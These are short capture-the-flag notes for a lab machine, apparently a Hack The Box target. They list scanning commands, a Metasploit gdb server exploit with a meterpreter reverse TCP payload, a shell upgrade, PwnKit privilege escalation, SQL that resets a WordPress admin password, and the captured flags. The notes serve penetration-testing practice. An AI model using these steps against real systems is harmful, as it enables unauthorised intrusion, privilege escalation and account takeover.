```sh
rustscan 10.10.11.125
nuclei -no-interactsh -u http://10.10.11.125/
searchsploit wordpress ebook
https://www.exploit-db.com/s/39575
https://www.rapid7.com/db/modules/expexploitloit/multi/gdb/gdb_server_exec/
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md
```

```sh
use exploit/multi/gdb/gdb_server_exec
set rhosts 10.10.11.125
set rport 1337
set targer 1
set payload linux/x64/meterpreter/reverse_tcp
run
shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
./PwnKit
/root/.ssh/authorized_keys
user
```

```sql
SELECT
  *
FROM
  INFORMATION_SCHEMA.TABLES;
GO

Select user from mysql.user;
Select user();

UPDATE `wp_users` SET `user_pass` = MD5( 'new_password' ) WHERE `wp_users`.`user_login` = "admin_username";
```

```sh
cat user.txt
ac3caba87ab0616870d09cd2ff5b3fc5

cd /root/
cat root.txt
09c200cc831eea371ebf4edff61ffcab
```